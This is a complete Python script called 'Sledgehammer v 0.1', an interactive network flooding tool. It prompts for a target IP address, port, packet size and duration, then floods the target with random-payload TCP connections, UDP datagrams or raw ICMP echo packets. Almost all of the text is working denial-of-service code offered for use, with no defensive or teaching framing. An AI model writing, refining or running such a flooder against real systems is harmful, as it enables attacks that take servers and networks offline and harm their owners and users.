import socket
import random
import time

# function to generate a random string
def random_string(length):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for i in range(length))

# function to perform TCP attack
def tcp_attack(ip, port, power, duration):
    print(f"Starting TCP attack on {ip}:{port} with power {power} for {duration} seconds")
    duration = time.time() + duration
    while True:
        if time.time() > duration:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendall(random_string(power).encode())
            s.close()
        except:
            pass
    print("TCP attack finished")

# function to perform UDP attack
def udp_attack(ip, port, power, duration):
    print(f"Starting UDP attack on {ip}:{port} with power {power} for {duration} seconds")
    duration = time.time() + duration
    while True:
        if time.time() > duration:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random_string(power).encode(), (ip, port))
            s.close()
        except:
            pass
    print("UDP attack finished")

# function to perform ICMP attack
def icmp_attack(ip, power, duration):
    print(f"Starting ICMP attack on {ip} with power {power} for {duration} seconds")
    duration = time.time() + duration
    while True:
        if time.time() > duration:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            packet_seq = random.randint(0, 65535)
            packet = b'\x08\x00\x00\x00' + packet_id.to_bytes(2, byteorder='big') + packet_seq.to_bytes(2, byteorder='big') + random_string(power).encode()
            s.sendto(packet, (ip, 0))
            s.close()
        except:
            pass
    print("ICMP attack finished")

# main program loop
print("Sledgehammer v 0.1")
print("Created by conteynerrr")
while True:
    print("Select a protocol:")
    print("1. TCP")
    print("2. UDP")
    print("3. ICMP")
    protocol = int(input("Enter protocol number: "))
    if protocol not in [1, 2, 3]:
        print("Invalid protocol number")
        continue

    ip = input("Enter IP address of target: ")
    port = int(input("Enter port number of target: "))
    power = int(input("Enter attack power (bytes per packet): "))
    duration = int(input("Enter attack duration (seconds): "))

    if protocol == 1:
        tcp_attack(ip, port, power, duration)
    elif protocol == 2:
        udp_attack(ip, port, power, duration)
    elif protocol == 3:
        icmp_attack(ip, power, duration)

    repeat = input("Do you want to repeat? (Y/N): ")
    if repeat.lower() != 'y':
        break
